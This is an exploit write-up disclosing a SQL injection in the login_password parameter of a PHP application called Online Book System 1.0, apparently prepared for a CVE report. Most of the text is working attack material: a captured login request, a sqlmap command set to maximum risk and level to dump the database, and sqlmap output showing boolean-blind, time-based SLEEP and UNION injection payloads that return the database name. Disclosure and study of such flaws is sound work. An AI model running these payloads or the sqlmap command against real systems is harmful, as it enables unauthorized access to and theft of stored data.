# Online Book System- SQL Injection - 2
+ **Exploit Title:** Online Book System- SQL Injection
+ **Date:** 2024-26-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/online-book-system-in-php-css-js-and-mysql-free-download/
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Book System 1.0 allows SQL Injection via the 'login_password' parameter at "localhost/BookStore-master 1/index.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "localhost/BookStore-master 1/index.php"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
POST /BookStore-master%201/index.php HTTP/1.1
Host: localhost
Content-Length: 62
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/BookStore-master%201/index.php?Message=successfully%20logged%20out!!
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=b7g245tvc3rrau75lpnecgj00n
Connection: close

login_username=test%40test.com&login_password=123&submit=login

```

+ Use sqlmap to exploit. In sqlmap, use 'login_password' parameter to dump the database.
```
sqlmap -r r.txt -p login_password --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: login_password (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: login_username=test@test.com&login_password=123' AND 4001=(SELECT (CASE WHEN (4001=4001) THEN 4001 ELSE (SELECT 8570 UNION SELECT 6855) END))-- -&submit=login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: login_username=test@test.com&login_password=123' AND (SELECT 7771 FROM (SELECT(SLEEP(5)))JoQz)-- kWnq&submit=login

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: login_username=test@test.com&login_password=123' UNION ALL SELECT CONCAT(0x717a627871,0x72637555694865686c74444d73696e4e764e73776b6a43584351724d66665857496b516179795771,0x71707a7871),NULL-- -&submit=login
---
[12:18:52] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:18:52] [INFO] fetching current database
current database: 'u385439067_store'

```
+ current database: `u385439067_store`

![Ekran görüntüsü 2024-03-26 192043](https://github.com/BurakSevben/CVEs/assets/117217689/b6b0fdea-788e-404b-9612-69a247488e82)

